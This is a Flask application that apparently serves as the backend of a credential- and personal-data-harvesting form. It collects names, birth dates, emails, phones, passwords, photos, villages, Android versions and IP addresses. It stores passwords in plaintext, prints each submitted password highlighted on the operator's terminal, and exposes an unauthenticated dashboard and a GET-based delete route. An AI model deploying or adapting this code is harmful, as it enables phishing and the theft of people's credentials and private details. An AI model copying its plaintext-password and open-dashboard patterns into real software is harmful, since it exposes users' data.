from flask import Flask, render_template, request, send_from_directory, redirect, url_for
from werkzeug.utils import secure_filename
import sqlite3
import os
import re
import uuid
import logging
from datetime import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "forms.db")
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024  # 5 MB

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Hide most Werkzeug logs in terminal
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# Terminal colors
RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[36m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
MAGENTA = "\033[35m"
RED = "\033[31m"


def ctext(text, color=""):
    return f"{color}{text}{RESET}"


def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            full_name TEXT NOT NULL,
            dob TEXT NOT NULL,
            gender TEXT NOT NULL,
            email TEXT NOT NULL,
            phone TEXT NOT NULL,
            password TEXT NOT NULL,
            photo TEXT,
            village TEXT NOT NULL,
            android_version TEXT,
            ip_address TEXT,
            created_at TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()


def allowed_file(filename):
    allowed = {"png", "jpg", "jpeg", "webp", "gif"}
    return "." in filename and filename.rsplit(".", 1)[1].lower() in allowed


@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    full_name = request.form.get("full_name", "").strip()
    dob = request.form.get("dob", "").strip()
    gender = request.form.get("gender", "").strip()
    email = request.form.get("email", "").strip()
    phone = request.form.get("phone", "").strip()

    if not phone.isdigit() or len(phone) != 10:
        return "Phone number must be exactly 10 digits.", 400

    password = request.form.get("password", "").strip()
    village = request.form.get("village", "").strip()
    android_version = request.form.get("android_version", "").strip()

    android_info = "Unknown"
    match = re.search(r"Android\s([\d.]+)", android_version)
    if match:
        android_info = f"Android {match.group(1)}"

    current_time = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")
    db_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    if "," in ip_address:
        ip_address = ip_address.split(",")[0].strip()

    if not all([full_name, dob, gender, email, phone, password, village]):
        return "Please fill all required fields.", 400

    photo_file = request.files.get("photo")
    saved_photo = None

    if photo_file and photo_file.filename:
        if allowed_file(photo_file.filename):
            safe_name = secure_filename(photo_file.filename)
            saved_photo = f"{uuid.uuid4().hex}_{safe_name}"
            photo_file.save(os.path.join(app.config["UPLOAD_FOLDER"], saved_photo))
        else:
            return "Only image files are allowed.", 400

    conn = sqlite3.connect(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO submissions
        (full_name, dob, gender, email, phone, password, photo, village, android_version, ip_address, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        full_name,
        dob,
        gender,
        email,
        phone,
        password,
        saved_photo,
        village,
        android_info,
        ip_address,
        db_time
    ))
    conn.commit()
    conn.close()

    print()
    print(ctext("========== NEW FORM SUBMISSION ==========", CYAN))
    print(f"{BOLD}{ctext('Name', GREEN)}{RESET}     : {full_name}")
    print(f"{BOLD}{ctext('DOB', GREEN)}{RESET}      : {dob}")
    print(f"{BOLD}{ctext('Gender', GREEN)}{RESET}   : {gender}")
    print(f"{BOLD}{ctext('Email', GREEN)}{RESET}    : {email}")
    print(f"{BOLD}{ctext('Phone', GREEN)}{RESET}    : {phone}")
    print(f"{BOLD}{ctext('Password', YELLOW)}{RESET} : {password}")
    print(f"{BOLD}{ctext('Village', GREEN)}{RESET}  : {village}")
    print(f"{BOLD}{ctext('Time', CYAN)}{RESET}     : {current_time}")
    print(f"{BOLD}{ctext('Android', CYAN)}{RESET}  : {android_info}")
    print(f"{BOLD}{ctext('IP', MAGENTA)}{RESET}       : {ip_address}")
    print(f"{BOLD}{ctext('Photo', GREEN)}{RESET}    : {saved_photo if saved_photo else 'No photo'}")
    print(ctext("=========================================", MAGENTA))
    print()

    return render_template("thankyou.html", name=full_name)

@app.route("/dashboard")
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute("SELECT * FROM submissions ORDER BY id DESC")
    rows = cur.fetchall()
    conn.close()
    return render_template("dashboard.html", rows=rows)


@app.route("/delete/<int:id>")
def delete(id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT photo FROM submissions WHERE id=?", (id,))
    row = cur.fetchone()

    if row and row[0]:
        photo_path = os.path.join(app.config["UPLOAD_FOLDER"], row[0])
        if os.path.exists(photo_path):
            os.remove(photo_path)

    cur.execute("DELETE FROM submissions WHERE id=?", (id,))
    conn.commit()
    conn.close()

    return redirect(url_for("dashboard"))


@app.route("/uploads/<path:filename>")
def uploads(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


if __name__ == "__main__":
    init_db()
    print(ctext("Server started on http://127.0.0.1:5000", CYAN))
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
